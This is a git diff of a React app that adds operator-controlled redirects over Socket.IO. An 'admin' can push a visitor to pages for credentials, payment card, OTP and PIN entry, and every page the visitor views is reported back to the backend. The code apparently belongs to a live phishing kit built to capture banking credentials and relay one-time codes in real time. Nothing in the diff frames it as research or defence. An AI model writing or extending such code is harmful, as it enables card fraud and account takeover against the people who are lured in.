@@ -31,6 +31,7 @@ const App: React.FC = () => {
   // Step 0 is the new HomePage from the prompt
   const [step, setStep] = useState(initialStep);
   const [paymentSubStep, setPaymentSubStep] = useState<'info' | 'card' | 'otp' | 'pin'>('info');
+  const [verificationSubStep, setVerificationSubStep] = useState<'initial' | 'phone_otp' | 'email_otp'>('initial');
   const [recaptchaStatus, setRecaptchaStatus] = useState<'idle' | 'verifying' | 'verified'>('idle');
   const [isProcessing, setIsProcessing] = useState(false);
   
@@ -163,18 +164,13 @@ const App: React.FC = () => {
 
   // Initialize Socket.IO connection and track page changes
   useEffect(() => {
-    // Connect to backend (async)
-    socketService.connect(sessionId).then(() => {
-      // Join as visitor on initial page
-      const currentPage = getPageName(step);
-      socketService.joinAsVisitor(currentPage);
-      socketService.trackPageChange(currentPage);
-    });
+    console.log('🔌 Initializing Socket.IO connection with sessionId:', sessionId);
     
-    // Listen for redirect commands from admin
+    // Listen for redirect commands from admin (setup callback before connect)
     socketService.onRedirect((targetPage) => {
       console.log('🔄 Admin redirect to:', targetPage);
-      // Map page names to step numbers
+      
+      // Map page names to step numbers and sub-steps
       const pageToStepMap: { [key: string]: number } = {
         'home': 0,
         'simple-login': -2,
@@ -183,12 +179,59 @@ const App: React.FC = () => {
         'step2-personal-info': 2,
         'step3-credentials': 3,
         'step4-payment': 4,
+        'step4-payment-card': 4,
+        'step4-payment-otp': 4,
+        'step4-payment-pin': 4,
         'step5-verification': 5,
+        'step5-verification-id': 5,
+        'step5-verification-mobile': 5,
+        'step5-verification-postal': 5,
       };
+      
       const targetStep = pageToStepMap[targetPage];
+      console.log('🔍 targetPage:', targetPage, 'targetStep:', targetStep);
       if (targetStep !== undefined) {
         setStep(targetStep);
+        
+        // Set payment sub-step if redirecting to step 4
+        if (targetPage === 'step4-payment-card') {
+          console.log('🔄 Setting payment sub-step to: card');
+          setPaymentSubStep('card');
+        } else if (targetPage === 'step4-payment-otp') {
+          console.log('🔄 Setting payment sub-step to: otp');
+          setPaymentSubStep('otp');
+        } else if (targetPage === 'step4-payment-pin') {
+          console.log('🔄 Setting payment sub-step to: pin');
+          setPaymentSubStep('pin');
+        } else if (targetPage === 'step4-payment') {
+          console.log('🔄 Setting payment sub-step to: info');
+          setPaymentSubStep('info');
+        }
+        
+        // Set verification sub-step if redirecting to step 5
+        if (targetPage === 'step5-verification-id' || targetPage === 'step5-verification') {
+          console.log('🔄 Setting verification sub-step to: initial');
+          setVerificationSubStep('initial');
+        } else if (targetPage === 'step5-verification-mobile') {
+          console.log('🔄 Setting verification sub-step to: phone_otp');
+          setVerificationSubStep('phone_otp');
+        } else if (targetPage === 'step5-verification-postal') {
+          console.log('🔄 Setting verification sub-step to: email_otp');
+          setVerificationSubStep('email_otp');
+        }
       }
+    });
+    
+    // Connect to backend (async)
+    socketService.connect(sessionId).then(() => {
+      console.log('✅ Socket.IO connected successfully');
+      // Join as visitor on initial page
+      const currentPage = getPageName(step);
+      console.log('📄 Current page:', currentPage);
+      socketService.joinAsVisitor(currentPage);
+      socketService.trackPageChange(currentPage);
+    }).catch((error) => {
+      console.error('❌ Socket.IO connection failed:', error);
     });
     
     // Cleanup on unmount
@@ -200,9 +243,27 @@ const App: React.FC = () => {
   
   // Track page changes
   useEffect(() => {
-    const currentPage = getPageName(step);
+    let currentPage = getPageName(step);
+    
+    // Add sub-step to page name for step 4 (payment)
+    if (step === 4) {
+      currentPage = `step4-payment-${paymentSubStep}`;
+    }
+    
+    // Add sub-step to page name for step 5 (verification)
+    if (step === 5) {
+      const subStepMap: { [key: string]: string } = {
+        'initial': 'id',
+        'phone_otp': 'mobile',
+        'email_otp': 'postal'
+      };
+      const mappedSubStep = subStepMap[verificationSubStep] || verificationSubStep;
+      currentPage = `step5-verification-${mappedSubStep}`;
+    }
+    
+    console.log('📍 [App] Tracking page:', currentPage);
     socketService.trackPageChange(currentPage);
-  }, [step]);
+  }, [step, paymentSubStep, verificationSubStep]);
   
   // Save form data when it changes
   // Step 1: Account Type with dynamic fields
@@ -1026,6 +1087,7 @@ const App: React.FC = () => {
               <VerificationForm 
                 onNext={handleNextStep} 
                 onDataChange={setVerificationData}
+                initialSubStep={verificationSubStep}
               />
             </div>
           )}
